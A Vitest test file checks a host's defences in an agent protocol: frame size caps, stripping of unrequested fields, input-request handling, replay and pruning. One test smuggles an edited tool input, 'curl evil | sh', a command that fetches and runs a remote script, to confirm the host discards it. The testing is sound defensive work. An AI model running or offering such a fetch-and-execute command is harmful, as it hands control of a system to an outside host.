// What a client can make the host keep: nothing it didn't ask for, nothing big, nothing twice.
import { describe, expect, it } from "vitest";
import { ActionType, PendingMessageKind, ROOT } from "../../src/ahp/wire.ts";
import { type Any, gate, rig, TestClient, turnStarted, userMessage } from "./support.ts";

const settle = () => new Promise<void>((r) => setTimeout(r, 0));
const rows = (t: Awaited<ReturnType<typeof rig>>) =>
  (t.db.all("SELECT COUNT(*) AS n FROM ahp_actions")[0] as { n: number }).n;
const dbBytes = (t: Awaited<ReturnType<typeof rig>>) =>
  (t.db.all("SELECT COALESCE(SUM(LENGTH(action)), 0) AS n FROM ahp_actions")[0] as { n: number }).n;

describe("a frame is small unless it carries an attachment", () => {
  it("refuses a 2 MB frame before parsing it, with an error naming the request, and keeps nothing", async () => {
    const t = await rig();
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    const before = rows(t);
    const big = "x".repeat(2 * 1024 * 1024);
    await t.host.receive(c.conn, JSON.stringify({ jsonrpc: "2.0", id: 77, method: "ping", params: { big } }));
    expect(c.socket.frames.at(-1)).toMatchObject({ id: 77, error: { code: -32600 } });
    expect(String((c.socket.frames.at(-1) as Any).error.message)).toMatch(/too large/);
    // a notification has no id to answer
    await t.host.receive(
      c.conn,
      JSON.stringify({
        jsonrpc: "2.0",
        method: "dispatchAction",
        params: {
          channel: chat,
          clientSeq: 1,
          action: { type: ActionType.ChatIsReadChanged, isRead: true, big },
        },
      }),
    );
    expect(c.socket.frames.at(-1)).toMatchObject({ id: null, error: { code: -32600 } });
    expect(rows(t)).toBe(before);
    expect(c.socket.closed).toBeUndefined(); // refused, not disconnected
    // five of them in a row add nothing either
    for (let i = 0; i < 5; i++) {
      await t.host.receive(
        c.conn,
        JSON.stringify({ jsonrpc: "2.0", id: 100 + i, method: "ping", params: { big } }),
      );
    }
    expect(dbBytes(t)).toBeLessThan(200_000);
  });

  it("lets a message with an image be as big as an image", async () => {
    const t = await rig();
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    const png = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.alloc(3 * 1024 * 1024, 5),
    ]);
    c.dispatch(
      chat,
      turnStarted("look", "t1", {
        attachments: [
          {
            type: "embeddedResource",
            label: "big.png",
            data: png.toString("base64"),
            contentType: "image/png",
          },
        ],
      }),
    );
    await t.host.idle();
    expect(t.host.chatState(chat)?.turns[0]?.message.attachments?.[0]).toMatchObject({
      type: "resource",
      sizeHint: png.length,
    });
  });
});

describe("the frame cap is structural, not a substring check", () => {
  const png = (n: number) =>
    Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(n, 5)]);
  const withImages = (...sizes: number[]) =>
    turnStarted("look", "t1", {
      attachments: sizes.map((n, i) => ({
        type: "embeddedResource",
        label: `i${i}.png`,
        data: png(n).toString("base64"),
        contentType: "image/png",
      })),
    });

  it("refuses a 13 MB ping that mentions dispatchAction and embeddedResource, and closes a repeat offender", async () => {
    const t = await rig();
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    const before = rows(t);
    // the two words as real keys, so they are in the frame as `"dispatchAction"` and `"embeddedResource"`
    const pad = "x".repeat(13 * 1024 * 1024);
    const ping = (id: number) =>
      JSON.stringify({
        jsonrpc: "2.0",
        id,
        method: "ping",
        params: { dispatchAction: 1, embeddedResource: 1, pad },
      });
    expect(ping(1)).toContain('"dispatchAction"');
    expect(ping(1)).toContain('"embeddedResource"');
    for (const id of [1, 2]) {
      await t.host.receive(c.conn, ping(1000 + id));
      expect(c.socket.frames.at(-1)).toMatchObject({ id: 1000 + id, error: { code: -32600 } });
      expect(String((c.socket.frames.at(-1) as Any).error.message)).toMatch(/too large/);
      expect(c.socket.closed).toBeUndefined();
    }
    await t.host.receive(c.conn, ping(1003));
    expect(c.socket.closed?.code).toBe(1008);
    expect(rows(t)).toBe(before);
    expect(t.host.connectionCount()).toBe(0);
  });

  it("refuses a dispatchAction that is big but carries no attachment, and one whose attachments are over the limit", async () => {
    const t = await rig();
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    const before = rows(t);
    // a big dispatchAction of the wrong kind, padded with a fake attachment-looking field
    await t.host.receive(
      c.conn,
      JSON.stringify({
        jsonrpc: "2.0",
        id: 5,
        method: "dispatchAction",
        params: {
          channel: chat,
          clientSeq: 1,
          action: { type: ActionType.ChatIsReadChanged, isRead: true, embeddedResource: "y".repeat(2e6) },
        },
      }),
    );
    expect(c.socket.frames.at(-1)).toMatchObject({ id: 5, error: { code: -32600 } });
    expect(rows(t)).toBe(before);
    // two 5.3 MB images are each fine and together over 10 MB: refused, and the strike counts
    c.dispatch(chat, withImages(5.3e6, 5.3e6));
    expect(rows(t)).toBe(before);
    expect(c.rejections().at(-1)?.rejectionReason).toMatch(/10 MB/);
    expect(c.socket.closed).toBeUndefined();
    c.dispatch(chat, withImages(5.3e6, 5.3e6));
    expect(c.socket.closed?.code).toBe(1008); // the third strike: the fake attachment, then these two
  });

  it("accepts one 10 MB image, the largest legitimate frame, and closes a frame over the transport cap", async () => {
    const t = await rig();
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    c.dispatch(chat, withImages(10 * 1024 * 1024 - 8));
    await t.host.idle();
    expect(c.rejections()).toEqual([]);
    expect(t.host.chatState(chat)?.turns[0]?.message.attachments?.[0]).toMatchObject({ type: "resource" });
    expect(t.host.limits.maxMessageBytes).toBeLessThan(15 * 1024 * 1024);
    expect(t.host.limits.maxMessageBytes).toBeGreaterThan(Math.ceil((10 * 1024 * 1024 * 4) / 3));
    const huge = "x".repeat(t.host.limits.maxMessageBytes + 1);
    await t.host.receive(
      c.conn,
      `{"jsonrpc":"2.0","id":9,"method":"ping","params":{"p":"dispatchAction embeddedResource ${huge}"}}`,
    );
    expect(c.socket.closed?.code).toBe(1009);
  });

  it("holds a connection that hasn't authenticated to 64 KB a frame", async () => {
    const t = await rig();
    const c = new TestClient(t.host, "stranger", false);
    await t.host.receive(
      c.conn,
      JSON.stringify({ jsonrpc: "2.0", id: 1, method: "ping", params: { pad: "x".repeat(70 * 1024) } }),
    );
    expect(c.socket.closed?.code).toBe(1009);
    expect(c.socket.frames.find((f) => f.id === 1)).toBeUndefined();
    // the same frame is fine once authenticated (a 70 KB frame is under the 1 MB cap)
    const d = t.client();
    await d.init();
    await t.host.receive(
      d.conn,
      JSON.stringify({ jsonrpc: "2.0", id: 2, method: "ping", params: { pad: "x".repeat(70 * 1024) } }),
    );
    expect(d.socket.frames.find((f) => f.id === 2)).toMatchObject({ id: 2 });
    expect(d.socket.closed).toBeUndefined();
  });
});

describe("a client's action is rebuilt from the fields it is allowed", () => {
  it("drops fields it didn't ask for from every action it may send", async () => {
    const t = await rig();
    const { session, chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, session, chat]);
    const junk = "j".repeat(100_000);
    c.dispatch(chat, { type: ActionType.ChatIsReadChanged, isRead: true, junk, _meta: { junk } });
    c.dispatch(chat, { type: ActionType.ChatIsArchivedChanged, isArchived: true, junk });
    c.dispatch(session, { type: ActionType.SessionIsReadChanged, isRead: true, junk });
    c.dispatch(session, { type: ActionType.SessionIsArchivedChanged, isArchived: true, junk });
    c.dispatch(session, { type: ActionType.SessionTitleChanged, title: "t", junk });
    c.dispatch(chat, {
      type: ActionType.ChatPendingMessageSet,
      kind: PendingMessageKind.Queued,
      id: "q",
      message: { ...userMessage("hi"), junk, _meta: { junk } },
      junk,
    });
    c.dispatch(chat, {
      type: ActionType.ChatPendingMessageRemoved,
      kind: PendingMessageKind.Queued,
      id: "q",
      junk,
    });
    c.dispatch(chat, { type: ActionType.ChatDraftChanged, draft: { ...userMessage("draft"), junk }, junk });
    expect(c.rejections()).toEqual([]);
    const logged = JSON.stringify(t.db.all("SELECT action FROM ahp_actions"));
    expect(logged).not.toContain("jjjjjjjjjj");
    expect(JSON.stringify(t.host.chatState(chat))).not.toContain("jjjjjjjjjj");
    expect(JSON.stringify(c.envelopes)).not.toContain("jjjjjjjjjj");
    expect(t.host.chatState(chat)?.draft?.text).toBe("draft");
  });

  it("answers a rejection with the action's type, not its contents", async () => {
    const t = await rig();
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    c.dispatch(chat, {
      type: ActionType.ChatTurnCancelled,
      turnId: "nope",
      duration: 0,
      junk: "j".repeat(500_000),
    });
    expect(c.rejections()).toHaveLength(1);
    expect(JSON.stringify(c.rejections()[0]).length).toBeLessThan(500);
  });

  it("caps a draft at 64 KB, a message at 256 KB, and ids and short strings at 256 characters", async () => {
    const t = await rig();
    const { session, chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, session, chat]);
    const rejected = (action: Record<string, unknown>, why: RegExp, on = chat) => {
      const n = c.rejections().length;
      c.dispatch(on, action);
      expect(c.rejections()[n]?.rejectionReason).toMatch(why);
    };
    rejected({ type: ActionType.ChatDraftChanged, draft: userMessage("d".repeat(64_001)) }, /at most 64000/);
    c.dispatch(chat, { type: ActionType.ChatDraftChanged, draft: userMessage("d".repeat(64_000)) });
    expect(t.host.chatState(chat)?.draft?.text).toHaveLength(64_000);
    rejected(
      {
        type: ActionType.ChatPendingMessageSet,
        kind: "queued",
        id: "q",
        message: userMessage("m".repeat(256_001)),
      },
      /at most 256000/,
    );
    rejected(
      {
        type: ActionType.ChatPendingMessageSet,
        kind: "queued",
        id: "i".repeat(129),
        message: userMessage("m"),
      },
      /short string/,
    );
    rejected(
      { type: ActionType.ChatPendingMessageRemoved, kind: "queued", id: "i".repeat(257) },
      /id must be a string/,
    );
    rejected(
      { type: ActionType.ChatQueuedMessagesReordered, order: ["a".repeat(300)] },
      /order must be a string/,
    );
    rejected(
      { type: ActionType.ChatQueuedMessagesReordered, order: Array(201).fill("a") },
      /list of message ids/,
    );
    rejected(
      { type: ActionType.ChatToolCallConfirmed, turnId: "t", toolCallId: "c".repeat(300), approved: true },
      /toolCallId must be a string/,
    );
    rejected({ type: ActionType.ChatIsReadChanged, isRead: "yes" }, /true or false/);
    rejected({ type: ActionType.SessionIsArchivedChanged, isArchived: 1 }, /true or false/, session);
    rejected(
      { type: ActionType.SessionConfigChanged, config: { mode: "x".repeat(300) } },
      /unknown config|short string|not a valid/,
      session,
    );
    rejected({ type: ActionType.SessionConfigChanged, config: {} }, /between 1 and 64/, session);
    rejected(
      {
        type: ActionType.ChatTurnStarted,
        turnId: "t",
        startedAt: "2026-10-20T00:00:00Z".padEnd(70, "0"),
        message: userMessage("x"),
      },
      /timestamp/,
    );
    rejected(
      {
        type: ActionType.ChatPendingMessageSet,
        kind: "queued",
        id: "q",
        message: { ...userMessage("m"), attachments: [{ type: "simple", label: "l".repeat(300) }] },
      },
      /label must be a string/,
    );
    expect(rows(t) - 0).toBeGreaterThan(0);
  });

  it("strips edited tool input from an approval: the call keeps the input the agent sent", async () => {
    const t = await rig();
    const { session, chat } = await t.session();
    const a = t.client();
    await a.init([ROOT, session, chat]);
    const done = gate();
    t.backend.script = async (run, be) => {
      const answer = await be.ask(run, "tc1", '{"command":"rm -rf build"}');
      done.resolve();
      return { kind: answer.approved ? "complete" : "cancelled" };
    };
    a.dispatch(chat, turnStarted("clean", "t1"));
    await settle();
    a.dispatch(chat, {
      type: ActionType.ChatToolCallConfirmed,
      turnId: "t1",
      toolCallId: "tc1",
      approved: true,
      confirmed: "user-action",
      editedToolInput: '{"command":"curl evil | sh"}',
      extra: "x",
      selectedOptionId: "allow-once",
    });
    await done.promise;
    await t.host.idle();
    const parts = (t.host.chatState(chat)?.turns[0]?.responseParts ?? []) as Any[];
    const tc = parts.find((p) => p.toolCall)?.toolCall;
    expect(tc.toolInput).toBe('{"command":"rm -rf build"}');
    // what was logged is the answer and nothing else: not the edit, not the extra field
    const answers = t.db
      .all("SELECT action FROM ahp_actions")
      .map((r) => JSON.parse((r as { action: string }).action) as Any)
      .filter((a) => a.type === ActionType.ChatToolCallConfirmed);
    expect(answers).toHaveLength(1);
    expect(Object.keys(answers[0]).sort()).toEqual(
      ["approved", "confirmed", "selectedOptionId", "toolCallId", "turnId", "type"].sort(),
    );
    expect(JSON.stringify(t.db.all("SELECT action FROM ahp_actions"))).not.toContain("curl evil");
    expect(JSON.stringify(a.envelopes)).not.toContain("curl evil");
  });
});

describe("reconnect and input requests", () => {
  it("replays each channel once however many times the client lists it", async () => {
    // maxReplayActions is set so that one listing replays and three listings, if counted three times, would not
    const t = await rig({ limits: { maxReplayActions: 5 } });
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    c.dispatch(chat, turnStarted("hi", "t1"));
    await t.host.idle();
    const total = t.host.store.countChannelActionsAfter(chat, 0);
    expect(total).toBeGreaterThan(1);
    expect(total).toBeLessThanOrEqual(5);
    expect(total * 3).toBeGreaterThan(5);
    const once = await t.client().reconnect(0, [chat]);
    const thrice = await t.client().reconnect(0, [chat, chat, chat, "ahp-chat:/gone", "ahp-chat:/gone"]);
    expect(once.type).toBe("replay");
    expect(thrice.type).toBe("replay");
    expect(once.actions).toHaveLength(total);
    expect(thrice.actions).toHaveLength(total);
    const seqs = thrice.actions.map((e: Any) => e.serverSeq);
    expect(new Set(seqs).size).toBe(total);
    expect(seqs).toEqual([...seqs].sort((x: number, y: number) => x - y));
    expect(thrice.missing).toEqual(["ahp-chat:/gone"]);
    const init = await t.client().rpc("initialize", {
      channel: ROOT,
      protocolVersions: ["1.0.0"],
      clientId: "d",
      initialSubscriptions: [chat, chat, chat],
    });
    expect((init.result as Any).snapshots).toHaveLength(1);
    // three listings count as one against the subscription limit too
    const e = t.client();
    const lim = t.host.limits.maxSubscriptions;
    const many = await e.rpc("reconnect", {
      channel: ROOT,
      clientId: "e",
      lastSeenServerSeq: 0,
      subscriptions: Array(lim * 3).fill(chat),
    });
    expect(many.error).toBeUndefined();
  });

  async function asking() {
    const t = await rig();
    const { session, chat } = await t.session();
    const a = t.client("a");
    const b = t.client("b");
    await a.init([ROOT, session, chat]);
    await b.init([ROOT, session, chat]);
    const release = gate();
    t.backend.script = async (run) => {
      run.emit({
        type: ActionType.ChatInputRequested,
        request: {
          id: "q1",
          message: "Which one?",
          questions: [{ id: "which", kind: "text", message: "name?" }],
        },
      } as never);
      await release.promise;
      return { kind: "complete" };
    };
    a.dispatch(chat, turnStarted("go", "t1"));
    await settle();
    return { t, chat, session, a, b, release };
  }
  const answer = (value: string) => ({ state: "submitted", value: { kind: "text", value } });

  it("rolls pending input requests into the session's needs-you list, and answers each request once, first wins", async () => {
    const { t, chat, session, a, b, release } = await asking();
    expect(t.host.sessionState(session)?.inputNeeded?.[0]).toMatchObject({ kind: "chatInput", chat });
    a.dispatch(chat, {
      type: ActionType.ChatInputAnswerChanged,
      requestId: "q1",
      questionId: "which",
      answer: answer("first"),
    });
    expect(a.rejections()).toEqual([]);
    a.dispatch(chat, {
      type: ActionType.ChatInputCompleted,
      requestId: "q1",
      response: "accept",
      answers: { which: answer("first") },
    });
    b.dispatch(chat, { type: ActionType.ChatInputCompleted, requestId: "q1", response: "decline" });
    b.dispatch(chat, {
      type: ActionType.ChatInputAnswerChanged,
      requestId: "q1",
      questionId: "which",
      answer: answer("late"),
    });
    expect(a.rejections()).toEqual([]);
    expect(b.rejections().map((r) => r.rejectionReason)).toEqual([
      expect.stringMatching(/not open \(someone answered it already/),
      expect.stringMatching(/not open/),
    ]);
    expect(t.backend.inputs).toEqual([{ requestId: "q1", response: "accept" }]); // the agent was told once
    expect(t.host.sessionState(session)?.inputNeeded).toBeUndefined();
    release.resolve();
    await t.host.idle();
  });

  it("rejects an answer to a request that was never asked, a question that isn't in it, or in a bad shape", async () => {
    const { t, chat, a, release } = await asking();
    const bad = (action: Record<string, unknown>, why: RegExp) => {
      const n = a.rejections().length;
      a.dispatch(chat, action);
      expect(a.rejections()[n]?.rejectionReason).toMatch(why);
    };
    bad({ type: ActionType.ChatInputCompleted, requestId: "ghost", response: "accept" }, /not open/);
    bad(
      {
        type: ActionType.ChatInputAnswerChanged,
        requestId: "ghost",
        questionId: "which",
        answer: answer("x"),
      },
      /not open/,
    );
    bad(
      { type: ActionType.ChatInputAnswerChanged, requestId: "q1", questionId: "nope", answer: answer("x") },
      /no such question/,
    );
    bad(
      {
        type: ActionType.ChatInputAnswerChanged,
        requestId: "q1",
        questionId: "which",
        answer: { state: "submitted", value: { kind: "text", value: 5 } },
      },
      /bad answer/,
    );
    bad(
      {
        type: ActionType.ChatInputAnswerChanged,
        requestId: "q1",
        questionId: "which",
        answer: answer("x".repeat(20_000)),
      },
      /at most 16 KB/,
    );
    bad(
      { type: ActionType.ChatInputCompleted, requestId: "q1", response: "maybe" },
      /accept, decline or cancel/,
    );
    bad(
      {
        type: ActionType.ChatInputCompleted,
        requestId: "q1",
        response: "accept",
        answers: { other: answer("x") },
      },
      /no such question/,
    );
    expect(t.backend.inputs).toEqual([]);
    release.resolve();
    await t.host.idle();
  });
});

describe("pruning keeps happening", () => {
  it("prunes on a timer and after many actions, not only at startup, and stops with the host", async () => {
    const t = await rig({
      limits: { pruneEveryMs: 20, pruneEveryActions: 1_000_000, retainMs: 0, snapshotEvery: 2 },
    });
    const { chat } = await t.session();
    const c = t.client();
    await c.init([ROOT, chat]);
    for (let i = 0; i < 3; i++) {
      c.dispatch(chat, turnStarted(`m${i}`, `t${i}`));
      await t.host.idle();
    }
    const before = rows(t);
    t.time.now += 10_000;
    await new Promise((r) => setTimeout(r, 80));
    expect(rows(t)).toBeLessThan(before);
    expect(t.host.store.floor()).toBeGreaterThan(0);
    t.host.close();

    const u = await rig({
      limits: { pruneEveryMs: 10 ** 9, pruneEveryActions: 8, retainMs: 0, snapshotEvery: 2 },
    });
    const s = await u.session();
    const d = u.client();
    await d.init([ROOT, s.chat]);
    u.time.now += 10_000;
    for (let i = 0; i < 4; i++) {
      d.dispatch(s.chat, turnStarted(`m${i}`, `t${i}`));
      await u.host.idle();
    }
    await new Promise((r) => setTimeout(r, 20));
    expect(u.host.store.floor()).toBeGreaterThan(0); // pruned because of the count
  });
});
